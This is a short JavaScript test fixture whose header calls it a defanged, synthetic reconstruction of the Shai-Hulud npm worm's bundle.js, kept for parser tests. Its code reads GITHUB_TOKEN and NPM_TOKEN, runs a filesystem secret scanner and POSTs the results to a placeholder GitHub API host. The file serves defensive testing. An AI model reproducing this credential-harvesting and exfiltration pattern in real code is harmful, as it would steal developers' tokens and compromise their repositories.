// DEFANGED RECONSTRUCTION of the Shai-Hulud bundle.js (September 2025), modeled on public incident analyses
// (see test/fixtures/reconstructions/inventory.json). Synthetic, not the original artifact.
// Parsed by capdelta tests only; never imported, installed, or executed.
// Kept: env token reads, secret-scanner process, GitHub API exfiltration
// shape. Omitted: the real scanner, repo/workflow creation, republishing.
// The original was a ~3.7 MB webpack bundle; this is a reduced stand-in.
const{execFileSync:x}=require("node:child_process");function harvest(){const t=process.env.GITHUB_TOKEN,n=process.env.NPM_TOKEN,f=x("capdelta-fixture-nonexistent-scanner",["filesystem","/"]);return fetch("https://api.github.example.test/user/repos",{method:"POST",headers:{authorization:"token "+t},body:JSON.stringify({name:"capdelta-fixture-exfil",data:String(f)+n})})}module.exports={harvest};
